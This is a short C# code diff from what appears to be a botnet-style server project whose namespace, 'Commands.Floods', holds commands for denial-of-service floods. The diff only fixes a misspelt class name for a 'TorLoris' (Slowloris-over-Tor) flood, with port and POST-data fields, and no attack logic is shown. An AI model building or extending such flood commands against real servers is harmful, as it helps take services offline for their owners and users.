@@ -6,12 +6,12 @@ namespace Alduin.Server.Commands.Floods
 {
     public class TorLorisCommand
     {
-        public TorLoisVariables newTorLoisVariables { get; set; }
+        public TorLorisVariables newTorLorisVariables { get; set; }
         public BaseCommands newBaseCommand { get; set; }
         public BaseFloodModel newBaseFloodModel { get; set; }
     }
 
-    public class TorLoisVariables
+    public class TorLorisVariables
     {
         public int Port { get; set; }
         public string PostDATA { get; set; }
